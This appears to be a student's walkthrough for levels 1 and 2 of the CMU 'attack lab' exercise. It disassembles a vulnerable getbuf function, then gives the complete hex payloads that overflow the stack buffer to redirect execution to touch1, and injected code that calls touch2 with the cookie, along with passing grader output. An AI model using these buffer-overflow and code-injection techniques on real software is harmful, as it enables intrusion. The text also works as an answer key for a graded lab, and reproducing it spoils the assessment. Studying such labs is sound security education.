> NOTE: Use -q to unlink the server

# Level 1

As is mentioned, there's function *getbuf* called:

``` c
void test(){
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val)
}
```

Here's the assembly code of getbuf:

``` assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

+ The function will get *0x28* chars, then *retq*

+ As is required, we should run *touch1* after execution:

  > Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

+ As mentioned, we use **buffer overflow**

+ Input 0x28 (40) chars (no matter how they are, we don't care about that), then input the address of *touch1* (*00000000004017c0*)

+ The address of *touch1* should be input increasing, as the stack's address is decreasing

``` 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

Then, we use *HEX2RAW* to change it:

``` bash
./hex2raw < level1.txt > raw_level1.txt
```

It's the answer of level 1

``` bash
./ctarget -q < raw_level1.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

# Level 2

Similar as **Level 1**, we need to run *touch2*

``` c
void touch2(unsigned val){
    vlevel = 2;
    if(val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }else{
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

``` assembly
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

Using *gdb* see the address of *rsp* is: 

``` bash
(gdb) info registers rsp
rsp            0x5561dca0          0x5561dca0
```

As the string length is *0x28*, the address of the string is *0x5561dca0 - 0x28 = 0x5561dc78* (as the stack address grow decreasing)

Here *val* is saved in *$edi*, and we want it to be equal as *cookie*. From the output of level1, we could get that *cookie* equals to *0x59b997fa*, thus the assembly we want to run is like:

``` assembly
pushq $0x4017ec # push the address of touch 2
mov $0x59b997fa, %edi # save cookie into edi
retq # return
```

Then, we can use *gcc -c* to compile, and use *objdump* to see the script:

``` assembly
0000000000000000 <.text>:
   0:	68 ec 17 40 00       	pushq  $0x4017ec
   5:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   a:	c3                   	retq   
```

Next, we fill him with *00* until its length is *0x28*. At the end, we write the starting address of the string (as we calculated before). Thus, the answer is:

``` 
68 ec 17 40 00 bf fa 97 b9 59 c3
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

``` bash
./ctarget -q < raw_level2.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 BF FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

